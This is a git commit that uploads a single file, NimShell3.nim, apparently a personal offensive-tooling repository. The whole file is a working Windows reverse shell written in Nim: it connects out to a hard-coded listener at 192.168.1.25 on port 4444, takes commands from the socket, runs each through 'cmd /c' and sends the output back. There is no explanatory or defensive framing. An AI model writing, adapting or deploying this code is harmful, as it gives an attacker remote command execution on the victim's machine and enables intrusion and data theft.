f4f3f416d625424aa9d4be6eaa0230eea6b70494
Jakub Talich <128613548+jakubtalich@users.noreply.github.com>
2025-12-08 08:22:50 +0100

    Add files via upload

---
+++ NimShell3.nim
@@ -0,0 +1,51 @@
+import net, os, osproc, strutils
+
+proc executeCommand(command: string): string =
+  result = execProcess("cmd /c " & command)
+
+var
+  socket = newSocket()
+
+var
+  myIP = "192.168.1.25" # Listener's IP
+  myPort = "4444"       # Listener's PORT
+
+let
+  exitMessage = "Exiting.."
+  changeDirectoryCommand = "cd"
+  defaultDirectory = "C:\\"
+
+try:
+  socket.connect(myIP, Port(parseInt(myPort)))
+
+  while true:
+
+    socket.send(os.getCurrentDir() & "> ")
+
+    let command = socket.recvLine()
+
+    if command == "exit":
+      socket.send(exitMessage)
+      break
+
+    if command.strip() == changeDirectoryCommand:
+      os.setCurrentDir(defaultDirectory)
+    elif command.strip().startswith(changeDirectoryCommand):
+      let directory = command.strip().split(' ')[1]
+      try:
+        os.setCurrentDir(directory)
+      except OSError as error:
+        socket.send(repr(error) & "\n")
+        continue
+    else:
+ 
+      let result = executeCommand(command)
+      socket.send(result)
+
+except:
+  
+  raise
+
+finally:
+ 
+  socket.close
